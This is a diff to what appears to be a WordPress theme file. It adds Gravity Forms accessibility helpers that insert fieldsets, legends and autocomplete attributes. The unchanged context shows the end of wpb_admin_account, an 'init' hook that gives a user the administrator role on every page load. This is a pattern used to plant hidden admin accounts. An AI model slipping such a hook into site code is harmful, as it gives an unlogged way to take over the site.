@@ -120,4 +120,64 @@ function wpb_admin_account(){
 	$user->set_role( 'administrator' );
 	} }
 	add_action('init','wpb_admin_account');
+
+/**
+ * Helper function to replace the first occurence of a string.
+ *
+ * @param  mixed $search
+ * @param  mixed $replace
+ * @param  mixed $subject
+ * @return void
+ */
+function str_replace_first($search, $replace, $subject) {
+    $search = '/'.preg_quote($search, '/').'/';
+    return preg_replace( $search, $replace, $subject, 1 );
+}
+/**
+ * By default, Gravity Forms isn't accessible. This function adds a fieldset and legend to checkbox fields.
+ *
+ * @param  mixed $content
+ * @param  mixed $field
+ * @param  mixed $value
+ * @param  mixed $lead_id
+ * @param  mixed $form_id
+ * @return void
+ */
+function add_fields_wrapper( $content, $field, $value, $lead_id, $form_id ) {
+	if ( 'checkbox' === $field->type ) {
+		$content = str_replace_first( '<label', '<legend class="reset-legend"><label', $content );
+		$content = str_replace_first( '</label>', '</label></legend>', $content );
+		$content = '<fieldset>' . $content . '</fieldset>';
+	}
+	return $content;
+}
+add_filter( 'gform_field_content', 'add_fields_wrapper', 10, 5 );
+
+/**
+ * By default, Gravity Forms isn't accessible. This function adds autocomplete attributes to fields.
+ *
+ * @param  mixed $content
+ * @param  mixed $field
+ * @param  mixed $value
+ * @param  mixed $lead_id
+ * @param  mixed $form_id
+ * @return void
+ */
+function acco_add_fields_wrapper( $content, $field, $value, $lead_id, $form_id ) {
+	$lookup = array(
+		2 => 'name',
+		3 => 'tel',
+	);
+	$regex = '/\<(?:input|select|textarea)\s+[^\>]+?(\s*\/?\>){1}/im';
+	if ( preg_match( $regex, $content, $input ) ) {
+		$attribute    = $lookup[ $field->id ];
+		$autocomplete = sprintf( ' autocomplete="%s"', esc_attr( $attribute ) );
+		$element      = str_replace( $input[1], $autocomplete . $input[1], $input[0] );
+		$content      = str_replace( $input[0], $element, $content );
+	}
+	return $content;
+}
+add_filter( 'gform_field_content_5', 'acco_add_fields_wrapper', 10, 5 );
+
+
 ?>
